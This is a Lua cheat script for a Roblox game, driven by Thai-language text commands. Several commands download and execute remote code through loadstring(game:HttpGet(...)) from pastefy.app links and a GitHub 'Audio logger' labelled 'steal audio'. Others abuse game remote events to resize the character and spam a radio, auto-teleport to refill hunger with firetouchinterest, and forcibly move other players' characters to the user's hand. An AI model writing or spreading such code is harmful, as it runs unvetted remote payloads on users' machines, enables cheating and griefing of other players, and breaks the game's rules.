local oldPositions = {}

-- 🔥 ฟังก์ชัน warn สีขาวชัด
local function whiteWarn(msg)
    warn("\255\255\255"..msg)  -- ANSI white text
end

confirmBtn.MouseButton1Click:Connect(function()
    playRandomZap(0.7)
    local cmd = textBox.Text:lower():gsub("^%s*(.-)%s*$", "%1")
    textBox.Text = ""
    
    pcall(function()
        if cmd:match("ความเร็ว") then
            local speed = tonumber(cmd:match("%d+"))
            if speed then
                local hum = getHumanoid()
                if hum then hum.WalkSpeed = speed; whiteWarn("✅ ความเร็วตั้งเป็น "..speed) end
            end
        elseif cmd == "รีตัว" then
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then char:BreakJoints(); whiteWarn("✅ รีตัวสำเร็จ") end
        elseif cmd == "ขโมยเสียง" then
            pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Audio%20logger")))
            whiteWarn("✅ ขโมยเสียงเริ่มแล้ว")
        elseif cmd == "ลำโพงหลากสี" then
            local colors = { BrickColor.new(331), BrickColor.new(1001), BrickColor.new(1003) }
            local radio = workspace:FindFirstChild("DRadio_Script")
            if radio then radio = radio:WaitForChild("Color", 3) end
            if radio then
                _G.SpeakerLoop = true
                task.spawn(function()
                    while _G.SpeakerLoop and radio and radio.Parent do
                        for _, color in ipairs(colors) do
                            if radio and radio.Parent then radio:FireServer(color) end
                            task.wait(0.1)
                        end
                    end
                end)
                whiteWarn("✅ ลำโพงหลากสีเปิดแล้ว")
            end
        elseif cmd == "เลิกลำโพงหลากสี" then
            _G.SpeakerLoop = false
            whiteWarn("✅ เลิกลำโพงหลากสี")
        elseif cmd == "ตำรวจ" then
            task.spawn(function()
                pcall(loadstring(game:HttpGet("https://pastefy.app/lnD46alx/raw")))
            end)
            whiteWarn("🚔 ตำรวจมาแล้ว! (เร็วทันใจ)")
        elseif cmd == "อ้อโต้ความหิว" then
            local hrp = getHRP()
            if not hrp then return end
            local targetPosition = Vector3.new(-27.47, 177.58, 236.50)
            local oldCFrame = hrp.CFrame
            task.spawn(function()
                while task.wait(1) do
                    local playerHunger = player:FindFirstChild("Hungry")
                    if playerHunger and playerHunger.Value <= 50 then
                        hrp.CFrame = CFrame.new(targetPosition + Vector3.new(0, 3, 0))
                        for _ = 1, 10 do
                            firetouchinterest(hrp, workspace.Terrain, 0)
                            task.wait(0.05)
                            firetouchinterest(hrp, workspace.Terrain, 1)
                            task.wait(0.05)
                        end
                        repeat task.wait(0.2)
                            firetouchinterest(hrp, workspace.Terrain, 0)
                            firetouchinterest(hrp, workspace.Terrain, 1)
                        until not player:FindFirstChild("Hungry") or player.Hungry.Value >= 100
                        hrp.CFrame = oldCFrame
                    end
                end
            end)
            whiteWarn("✅ อ้อโต้ความหิวเปิดแล้ว")
        elseif cmd == "ตัวสูง" then
            local args = {{ BodyScale = { BodyTypeScale = 1.5, DepthScale = 0.5, HeadScale = 1, HeightScale = 1.5, WidthScale = 0.5, ProportionScale = 0 } }}
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("BloxbizRemotes")
            if remote then remote = remote:FindFirstChild("CatalogOnApplyToRealHumanoid") end
            if remote then remote:FireServer(unpack(args)); whiteWarn("✅ ตัวสูงแล้ว") end
        elseif cmd == "ตัวเล็ก" then
            local args = {{ BodyScale = { BodyTypeScale = 0, DepthScale = 0.9949401021003723, HeadScale = 1, HeightScale = 0.5, WidthScale = 0.6259825229644775, ProportionScale = 0 } }}
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("BloxbizRemotes")
            if remote then remote = remote:FindFirstChild("CatalogOnApplyToRealHumanoid") end
            if remote then remote:FireServer(unpack(args)); whiteWarn("✅ ตัวเล็กแล้ว") end
        elseif cmd == "จับโจร" then
            _G.CatchStarLoop = true
            oldPositions = {}
            task.spawn(function()
                while _G.CatchStarLoop do
                    for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
                        if targetPlayer ~= player and targetPlayer.Character and targetPlayer:FindFirstChild("Star") then
                            local starValue = targetPlayer.Star.Value
                            if starValue >= 1 and starValue <= 5 then
                                local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
                                local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                                if rightHand and targetHRP then
                                    if not oldPositions[targetPlayer] then oldPositions[targetPlayer] = targetHRP.CFrame end
                                    targetHRP.CFrame = rightHand.CFrame
                                end
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
            whiteWarn("✅ จับโจรเปิดแล้ว")
        elseif cmd == "เลิกจับโจร" then
            _G.CatchStarLoop = false
            task.spawn(function()
                for targetPlayer, oldCFrame in pairs(oldPositions) do
                    local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if targetHRP then targetHRP.CFrame = oldCFrame end
                end
                oldPositions = {}
            end)
            whiteWarn("✅ เลิกจับโจร")
        elseif cmd == "ปืน" then
            -- 🔥 เปลี่ยนใหม่: รัน HttpGet นี้แทน!
            task.spawn(function()
                pcall(loadstring(game:HttpGet("https://pastefy.app/2vTIdDO8/raw")))()
            end)
            whiteWarn("🔫 ได้ปืนแล้ว! (สคริปต์ใหม่)")
        elseif cmd == "เกิดกลับ" then
            if _G.ReviveBackConnection then _G.ReviveBackConnection:Disconnect() end
            _G.LastDeathPos = nil
            _G.ReviveBackConnection = player.CharacterAdded:Connect(function(char)
                task.wait(1)
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp and _G.LastDeathPos then hrp.CFrame = _G.LastDeathPos end
            end)
            task.spawn(function()
                while player.Character do
                    local char = player.Character
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    if humanoid and humanoid.Health <= 0 then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp then _G.LastDeathPos = hrp.CFrame end
                    end
                    task.wait(0.2)
                end
            end)
            whiteWarn("✅ เกิดกลับเปิดแล้ว")
        elseif cmd == "เลิกเกิดกลับ" then
            if _G.ReviveBackConnection then _G.ReviveBackConnection:Disconnect(); _G.ReviveBackConnection = nil end
            _G.LastDeathPos = nil
            whiteWarn("✅ เลิกเกิดกลับ")
        elseif cmd == "ui แอดมิน" then
            if isVIP(player.Name) then
                whiteWarn("✅ เปิด UI แอดมินได้ (VIP)")
            else
                whiteWarn("❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
            end
        elseif cmd == "ตั้งค่า" then
            settingsFrame.Visible = true
            settingsFrame.BackgroundTransparency = 1
            TweenService:Create(settingsFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {BackgroundTransparency = 0}):Play()
            playRandomZap(0.4)
        elseif cmd == "ปิดตั้งค่า" then
            if settingsFrame.Visible then
                playRandomZap(0.2)
                TweenService:Create(settingsFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
                task.delay(0.3, function() settingsFrame.Visible = false end)
            end
        else
            whiteWarn("❌ ไม่พบคำสั่ง: "..cmd)
        end
    end)
end)

